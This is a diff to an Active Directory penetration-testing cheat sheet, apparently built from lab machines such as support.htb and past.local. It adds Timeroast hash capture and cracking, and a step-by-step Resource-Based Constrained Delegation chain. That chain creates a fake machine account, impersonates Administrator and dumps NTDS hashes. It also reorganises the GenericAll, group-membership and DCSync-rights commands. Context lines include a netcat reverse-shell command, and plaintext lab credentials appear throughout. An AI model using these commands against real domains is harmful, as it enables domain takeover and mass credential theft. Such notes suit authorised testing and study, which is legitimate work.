@@ -783,6 +783,7 @@ if you get access , Look for usernames using netexec , --rid-brute , --users and
 - Check usernames found with kerbrute .  
 - Search for ASREP Roastable Users .
 - Once we have valid Creds : Check Kerberoastable users + Spray the password on all users .
+- If we have the machine account names check for TimeRoast Attacks. 
 - Try to authenticate using every protocol .
 - Enumerate shares with those Users found . Use netexec to download .
 - Check Certipy for Vulnerable Templates . 
@@ -991,6 +992,15 @@ Rubeus.exe kerberoast /outfile:hashes.txt
 
 Rubeus.exe asreproast /outfile:hashes.txt 
 ```
+
+### Time Roast : 
+
+```bash
+nxc smb $target -u 'guest' -p '' -M timeroast
+
+hashcat -m 31300 hashes /usr/share/wordlists/rockyou.txt
+```
+
 
 #### Testing All Protocols :
 
@@ -1717,49 +1727,6 @@ echo 'C:\windows\temp\nc.exe -e cmd.exe KALIIP PORT' > rev.bat
 .\juicypotato.exe -l 3375 -t * -p rev.bat .
 ```
 
-### Generic Right Over DC machine : Linux :
-
-```bash
-#How this attack works ? First we need a user to have generic ALL or genric Right over the
-#DC machine , then what we can do is create a new Machine ME0X in this case , since we are
-#part of the Authenticated group which means we can create up to 10 machines on the domain
-#Then what we did was **Resource-Based Constrained Delegation (RBCD) , which means we tell
-#the DC to trust ME0X to impersonate any user that is on the DC machine , since we can 
-#Impersonate them we needed to request a TGT on their behalf and do DCSync . 
-===> Correction: The attacker requests an ST, not a TGT (Ticket Granting Ticket), 
-===> on the Administrator's' behalf for a specific service (like CIFS) running on the DC.
-===> CIFS is the file system 
-
-# Adding the Computer :**
-impacket-addcomputer -method SAMR -computer-name 'ME0X' -computer-pass 'Summer2018!' -dc-host $target -domain-netbios 'SUPPORT' 'support.htb/support:Ironside47pleasure40Watchful'
-**# Delegating ME0X tp the DC :** 
-impacket-rbcd -delegate-from 'ME0X$' -delegate-to 'DC$' -action 'write' 'support.htb/support:Ironside47pleasure40Watchful' 
-# **Requesting the ST : ( Service Ticket )**
-impacket-getST -spn 'cifs/dc.support.htb' -impersonate 'administrator' 'support.htb/ME0X$:Summer2018!'  
-**# Exporting the Ticket to our session :**
-export KRB5CCNAME=administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache 
-**# DC Sync with the Ticket :** 
-impacket-secretsdump -k -no-pass -just-dc-ntlm support.htb/administrator@$target
-```
-
-### Generic ALL over a  Group : Linux :
-
-```bash
-# List Group Members : 
-net rpc group members "EXCHANGE WINDOWS PERMISSIONS" -U htb.local/svc-alfresco%'s3rvice' -S $target  
-
-# Add Our User to that group : 
-net rpc group addmem "EXCHANGE WINDOWS PERMISSIONS" "svc-alfresco" -U htb.local/svc-alfresco -S $target
-
-```
-
-### Write DACL over the entire Domain : Linux :
-
-```bash
-# Give our user DCSync Privs : 
-impacket-dacledit -action 'write' -rights 'DCSync' -principal 'svc-alfresco' -target-dn 'DC=htb,DC=local' 'htb.local'/'svc-alfresco':'s3rvice'
-```
-
 ### Metasploit :
 
 ```bash
@@ -1879,6 +1846,7 @@ python3 wmiexec2.py anomaly.hsm/anna_molly@$target -hashes ':be4bf3131851aee9a42
 - **Genric Write Can allow us to move a user to an OU, in case we had Generic ALL over an OU**
 - **Generic Write over the GPO can grant us DA , we use GPOabuse and it will create a new user that is DA**
 
+#### Common Ones : 
 
 ```bash
 
@@ -1937,7 +1905,82 @@ DS-Replication-Get-Changes-All
 it s game over . 
 
 ```
+#### Generic Right Over DC machine : Linux :
 
+```bash
+#How this attack works ? First we need a user to have generic ALL or genric Right over the
+#DC machine , then what we can do is create a new Machine ME0X in this case , since we are
+#part of the Authenticated group which means we can create up to 10 machines on the domain
+#Then what we did was **Resource-Based Constrained Delegation (RBCD) , which means we tell
+#the DC to trust ME0X to impersonate any user that is on the DC machine , since we can 
+#Impersonate them we needed to request a TGT on their behalf and do DCSync . 
+===> Correction: The attacker requests an ST, not a TGT (Ticket Granting Ticket), 
+===> on the Administrator's' behalf for a specific service (like CIFS) running on the DC.
+===> CIFS is the file system 
+
+# Adding the Computer :**
+impacket-addcomputer -method SAMR -computer-name 'ME0X' -computer-pass 'Summer2018!' -dc-host $target -domain-netbios 'SUPPORT' 'support.htb/support:Ironside47pleasure40Watchful'
+**# Delegating ME0X tp the DC :** 
+impacket-rbcd -delegate-from 'ME0X$' -delegate-to 'DC$' -action 'write' 'support.htb/support:Ironside47pleasure40Watchful' 
+# **Requesting the ST : ( Service Ticket )**
+impacket-getST -spn 'cifs/dc.support.htb' -impersonate 'administrator' 'support.htb/ME0X$:Summer2018!'  
+**# Exporting the Ticket to our session :**
+export KRB5CCNAME=administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache 
+**# DC Sync with the Ticket :** 
+impacket-secretsdump -k -no-pass -just-dc-ntlm support.htb/administrator@$target
+```
+
+#### Generic ALL over a  Group : Linux :
+
+```bash
+# List Group Members : 
+net rpc group members "EXCHANGE WINDOWS PERMISSIONS" -U htb.local/svc-alfresco%'s3rvice' -S $target  
+
+# Add Our User to that group : 
+net rpc group addmem "EXCHANGE WINDOWS PERMISSIONS" "svc-alfresco" -U htb.local/svc-alfresco -S $target
+```
+
+#### Write DACL over the entire Domain : Linux :
+
+```bash
+# Give our user DCSync Privs : 
+impacket-dacledit -action 'write' -rights 'DCSync' -principal 'svc-alfresco' -target-dn 'DC=htb,DC=local' 'htb.local'/'svc-alfresco':'s3rvice'
+```
+
+#### RCBD : Generic All over the DC machine : 
+
+```bash
+# 1. Generate krb5.conf for the domain (nxc helper)
+nxc smb $target --generate-krb5-file kerb_conf
+export KRB5_CONFIG=kerb_conf
+
+# 2. Get a TGT for the initial low-priv user (tyler)
+impacket-getTGT past.local/'tyler':'5rtfgvb%RTFGVB' -dc-ip $target
+export KRB5CCNAME=tyler.ccache
+
+# 3. Add a new computer account (FAKE$) using tyler's machine account quota rights
+impacket-addcomputer -computer-name 'FAKE$' -computer-pass 'WEAK.123' \
+  -dc-host EC2AMAZ-A5O4OL8.past.local -k -no-pass 'past.local/tyler'
+
+# 4. Write Resource-Based Constrained Delegation: let FAKE$ delegate to the DC/target machine
+rbcd.py past.local/tyler -k -no-pass \
+  -delegate-to 'EC2AMAZ-A5O4OL8$' -delegate-from 'FAKE$' -action write
+
+# (optional) confirm it landed
+rbcd.py past.local/tyler -k -no-pass -delegate-to 'EC2AMAZ-A5O4OL8$' -action read
+
+# 5. Get a TGT for the new FAKE$ machine account
+impacket-getTGT past.local/'FAKE$':'WEAK.123' -dc-ip $target
+export KRB5CCNAME=FAKE\$.ccache
+
+# 6. S4U2Self + S4U2Proxy: impersonate Administrator via FAKE$'s delegation rights
+impacket-getST -spn cifs/EC2AMAZ-A5O4OL8.past.local -impersonate administrator \
+  -k -no-pass -dc-ip $target past.local/'FAKE$'
+
+# 7. Use the impersonated Administrator ticket
+export KRB5CCNAME=administrator@cifs_EC2AMAZ-A5O4OL8.past.local@PAST.LOCAL.ccache
+nxc smb $target -u administrator -k --use-kcache --ntds
+```
 
 
 ### WMI Profile :
@@ -2005,6 +2048,21 @@ export KRB5CCNAME=/tmp/krb5cc_1000
 5/ Use it :
 nxc smb Anomaly-DC.anomaly.hsm -u 'Brandon_Boyd' -k --use-kcache
 
+```
+```bash
+
+# Configuring Realm via nxc :
+
+nxc smb $target --generate-krb5-file past.krb
+export KRB5_CONFIG=kerb_conf
+nxc smb $target -u 'APPDEV01$'  -p 'P@ssw0rd!' -k
+
+==> Generate a TGT :
+impacket-getTGT past.local/'APPDEV01$':'P@ssw0rd!' -dc-ip $target
+export KRB5CCNAME=APPDEV01$.ccache
+
+==> Test
+nxc smb $target -u 'APPDEV01$'  -k --use-kcache
 ```
 
 
